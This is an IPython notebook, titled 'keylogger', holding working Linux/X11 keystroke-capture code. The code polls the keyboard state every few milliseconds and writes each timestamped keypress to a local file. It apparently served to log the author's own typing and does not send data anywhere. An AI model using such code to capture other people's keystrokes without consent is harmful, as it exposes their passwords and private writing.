{
 "metadata": {
  "name": "",
  "signature": "sha256:b580f8e4bee07a9fa2152a8cf8f2e075839745653ad2a8ef755dd7dada36ac25"
 },
 "nbformat": 3,
 "nbformat_minor": 0,
 "worksheets": [
  {
   "cells": [
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "<img src=\"http://mirageforum.com/forum/attachment.php?attachmentid=159&d=1370617142\">"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "back to [Index](index.ipynb)"
     ]
    },
    {
     "cell_type": "heading",
     "level": 1,
     "metadata": {},
     "source": [
      "keylogger"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "2014-08-09"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "# Cross-notebook include shim\n",
      "with open(\"nbinclude.ipynb\") as nbinclude_f: # don't rename nbinclude_f\n",
      "    import IPython.nbformat.current\n",
      "    get_ipython().run_cell(IPython.nbformat.current.read(nbinclude_f, 'json').worksheets[0].cells[0].input)"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 36
    },
    {
     "cell_type": "code",
     "collapsed": true,
     "input": [
      "# Copyright (c) 2011, Andrew Moffat\n",
      "# All rights reserved.\n",
      "\n",
      "# Redistribution and use in source and binary forms, with or without\n",
      "# modification, are permitted provided that the following conditions are met:\n",
      "#     * Redistributions of source code must retain the above copyright\n",
      "#       notice, this list of conditions and the following disclaimer.\n",
      "#     * Redistributions in binary form must reproduce the above copyright\n",
      "#       notice, this list of conditions and the following disclaimer in the\n",
      "#       documentation and/or other materials provided with the distribution.\n",
      "#     * Neither the name of the <organization> nor the\n",
      "#       names of its contributors may be used to endorse or promote products\n",
      "#       derived from this software without specific prior written permission.\n",
      "\n",
      "# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND\n",
      "# ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED\n",
      "# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE\n",
      "# DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY\n",
      "# DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES\n",
      "# (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;\n",
      "# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND\n",
      "# ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n",
      "# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS\n",
      "# SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n",
      "\n",
      "\n",
      "import sys\n",
      "import time\n",
      "# from time import sleep, time\n",
      "import ctypes as ct\n",
      "from ctypes.util import find_library\n",
      "\n",
      "\n",
      "# linux only!\n",
      "assert(\"linux\" in sys.platform)\n",
      "\n",
      "\n",
      "x11 = ct.cdll.LoadLibrary(find_library(\"X11\"))\n",
      "display = x11.XOpenDisplay(None)\n",
      "\n",
      "\n",
      "# this will hold the keyboard state.  32 bytes, with each\n",
      "# bit representing the state for a single key.\n",
      "keyboard = (ct.c_char * 32)()\n",
      "\n",
      "# these are the locations (byte, byte value) of special\n",
      "# keys to watch\n",
      "shift_keys = ((6,4), (7,64))\n",
      "modifiers = {\n",
      "    \"left shift\": (6,4),\n",
      "    \"right shift\": (7,64),\n",
      "    \"left ctrl\": (4,32),\n",
      "    \"right ctrl\": (13,2),\n",
      "    \"left alt\": (8,1),\n",
      "    \"right alt\": (13,16)\n",
      "}\n",
      "last_pressed = set()\n",
      "last_pressed_adjusted = set()\n",
      "last_modifier_state = {}\n",
      "caps_lock_state = 0\n",
      "\n",
      "# key is byte number, value is a dictionary whose\n",
      "# keys are values for that byte, and values are the\n",
      "# keys corresponding to those byte values\n",
      "key_mapping = {\n",
      "    1: {\n",
      "        0b00000010: \"<esc>\",\n",
      "        0b00000100: (\"1\", \"!\"),\n",
      "        0b00001000: (\"2\", \"@\"),\n",
      "        0b00010000: (\"3\", \"#\"),\n",
      "        0b00100000: (\"4\", \"$\"),\n",
      "        0b01000000: (\"5\", \"%\"),\n",
      "        0b10000000: (\"6\", \"^\"),\n",
      "    },\n",
      "    2: {\n",
      "        0b00000001: (\"7\", \"&\"),\n",
      "        0b00000010: (\"8\", \"*\"),\n",
      "        0b00000100: (\"9\", \"(\"),\n",
      "        0b00001000: (\"0\", \")\"),\n",
      "        0b00010000: (\"-\", \"_\"),\n",
      "        0b00100000: (\"=\", \"+\"),\n",
      "        0b01000000: \"<backspace>\",\n",
      "        0b10000000: \"<tab>\",\n",
      "    },\n",
      "    3: {\n",
      "        0b00000001: (\"q\", \"Q\"),\n",
      "        0b00000010: (\"w\", \"W\"),\n",
      "        0b00000100: (\"e\", \"E\"),\n",
      "        0b00001000: (\"r\", \"R\"),\n",
      "        0b00010000: (\"t\", \"T\"),\n",
      "        0b00100000: (\"y\", \"Y\"),\n",
      "        0b01000000: (\"u\", \"U\"),\n",
      "        0b10000000: (\"i\", \"I\"),\n",
      "    },\n",
      "    4: {\n",
      "        0b00000001: (\"o\", \"O\"),\n",
      "        0b00000010: (\"p\", \"P\"),\n",
      "        0b00000100: (\"[\", \"{\"),\n",
      "        0b00001000: (\"]\", \"}\"),\n",
      "        0b00010000: \"<enter>\",\n",
      "        #0b00100000: \"<left ctrl>\",\n",
      "        0b01000000: (\"a\", \"A\"),\n",
      "        0b10000000: (\"s\", \"S\"),\n",
      "    },\n",
      "    5: {\n",
      "        0b00000001: (\"d\", \"D\"),\n",
      "        0b00000010: (\"f\", \"F\"),\n",
      "        0b00000100: (\"g\", \"G\"),\n",
      "        0b00001000: (\"h\", \"H\"),\n",
      "        0b00010000: (\"j\", \"J\"),\n",
      "        0b00100000: (\"k\", \"K\"),\n",
      "        0b01000000: (\"l\", \"L\"),\n",
      "        0b10000000: (\";\", \":\"),\n",
      "    },\n",
      "    6: {\n",
      "        0b00000001: (\"'\", \"\\\"\"),\n",
      "        0b00000010: (\"`\", \"~\"),\n",
      "        #0b00000100: \"<left shift>\",\n",
      "        0b00001000: (\"\\\\\", \"|\"),\n",
      "        0b00010000: (\"z\", \"Z\"),\n",
      "        0b00100000: (\"x\", \"X\"),\n",
      "        0b01000000: (\"c\", \"C\"),\n",
      "        0b10000000: (\"v\", \"V\"),\n",
      "    },\n",
      "    7: {\n",
      "        0b00000001: (\"b\", \"B\"),\n",
      "        0b00000010: (\"n\", \"N\"),\n",
      "        0b00000100: (\"m\", \"M\"),\n",
      "        0b00001000: (\",\", \"<\"),\n",
      "        0b00010000: (\".\", \">\"),\n",
      "        0b00100000: (\"/\", \"?\"),\n",
      "        #0b01000000: \"<right shift>\",\n",
      "    },\n",
      "    8: {\n",
      "        #0b00000001: \"<left alt>\",\n",
      "        0b00000010: \" \",\n",
      "        0b00000100: \"<caps lock>\",\n",
      "    },\n",
      "    13: {\n",
      "        #0b00000010: \"<right ctrl>\",\n",
      "        #0b00010000: \"<right alt>\",\n",
      "    },\n",
      "}\n",
      "\n",
      "\n",
      "\n",
      "\n",
      "def fetch_keys_raw():\n",
      "    x11.XQueryKeymap(display, keyboard)\n",
      "    return keyboard\n",
      "\n",
      "\n",
      "\n",
      "def fetch_keys():\n",
      "    global caps_lock_state, last_pressed, last_pressed_adjusted, last_modifier_state\n",
      "    keypresses_raw = fetch_keys_raw()\n",
      "\n",
      "\n",
      "    # check modifier states (ctrl, alt, shift keys)\n",
      "    modifier_state = {}\n",
      "    for mod, (i, byte) in modifiers.iteritems():\n",
      "        modifier_state[mod] = bool(ord(keypresses_raw[i]) & byte)\n",
      "    \n",
      "    # shift pressed?\n",
      "    shift = 0\n",
      "    for i, byte in shift_keys:\n",
      "        if ord(keypresses_raw[i]) & byte:\n",
      "            shift = 1\n",
      "            break\n",
      "\n",
      "    # caps lock state\n",
      "    if ord(keypresses_raw[8]) & 4: caps_lock_state = int(not caps_lock_state)\n",
      "\n",
      "\n",
      "    # aggregate the pressed keys\n",
      "    pressed = []\n",
      "    for i, k in enumerate(keypresses_raw):\n",
      "        o = ord(k)\n",
      "        if o:\n",
      "            for byte,key in key_mapping.get(i, {}).iteritems():\n",
      "                if byte & o:\n",
      "                    if isinstance(key, tuple): key = key[shift or caps_lock_state]\n",
      "                    pressed.append(key)\n",
      "\n",
      "    \n",
      "    tmp = pressed\n",
      "    pressed = list(set(pressed).difference(last_pressed))\n",
      "    state_changed = tmp != last_pressed and (pressed or last_pressed_adjusted)\n",
      "    last_pressed = tmp\n",
      "    last_pressed_adjusted = pressed\n",
      "\n",
      "    if pressed: pressed = pressed[0]\n",
      "    else: pressed = None\n",
      "\n",
      "\n",
      "    state_changed = last_modifier_state and (state_changed or modifier_state != last_modifier_state)\n",
      "    last_modifier_state = modifier_state\n",
      "\n",
      "    return state_changed, modifier_state, pressed\n",
      "\n",
      "def log(done, callback, sleep_interval=.005):\n",
      "    while not done():\n",
      "        sleep(sleep_interval)\n",
      "        changed, modifiers, keys = fetch_keys()\n",
      "        if changed: callback(time(), modifiers, keys)\n"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 37
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "import time\n",
      "import datetime"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 38
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "filename= 'keys_' + str(datetime.datetime.now())\n",
      "filename= filename.replace(' ', '_')\n",
      "filename"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 39,
       "text": [
        "'keys_2014-08-09_20:31:01.072783'"
       ]
      }
     ],
     "prompt_number": 39
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "outfile = open(filename, 'w')"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 40
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "!du  keys_2014-08-09_20:31:01.072783"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "24\tkeys_2014-08-09_20:31:01.072783\r\n"
       ]
      }
     ],
     "prompt_number": 45
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "last_flush=0\n",
      "while True:\n",
      "    time.sleep(.005)\n",
      "    changed, mods, keys = fetch_keys()\n",
      "    if changed: \n",
      "        output=\"%r, %r, %r\\n\" % (time.time(), keys, mods)\n",
      "        outfile.write(output)\n",
      "    if time.time() - last_flush > 5:\n",
      "#         print 'flushing..' + str(time.time())\n",
      "        outfile.flush()\n",
      "        last_flush = time.time()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "ename": "KeyboardInterrupt",
       "evalue": "",
       "output_type": "pyerr",
       "traceback": [
        "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m\n\u001b[1;31mKeyboardInterrupt\u001b[0m                         Traceback (most recent call last)",
        "\u001b[1;32m<ipython-input-46-192bec40bcd5>\u001b[0m in \u001b[0;36m<module>\u001b[1;34m()\u001b[0m\n\u001b[0;32m      1\u001b[0m \u001b[0mlast_flush\u001b[0m\u001b[1;33m=\u001b[0m\u001b[1;36m0\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m      2\u001b[0m \u001b[1;32mwhile\u001b[0m \u001b[0mTrue\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m----> 3\u001b[1;33m     \u001b[0mtime\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0msleep\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;36m.005\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m      4\u001b[0m     \u001b[0mchanged\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mmods\u001b[0m\u001b[1;33m,\u001b[0m \u001b[0mkeys\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mfetch_keys\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m      5\u001b[0m     \u001b[1;32mif\u001b[0m \u001b[0mchanged\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
        "\u001b[1;31mKeyboardInterrupt\u001b[0m: "
       ]
      }
     ],
     "prompt_number": 46
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [],
     "language": "python",
     "metadata": {},
     "outputs": []
    }
   ],
   "metadata": {}
  }
 ]
}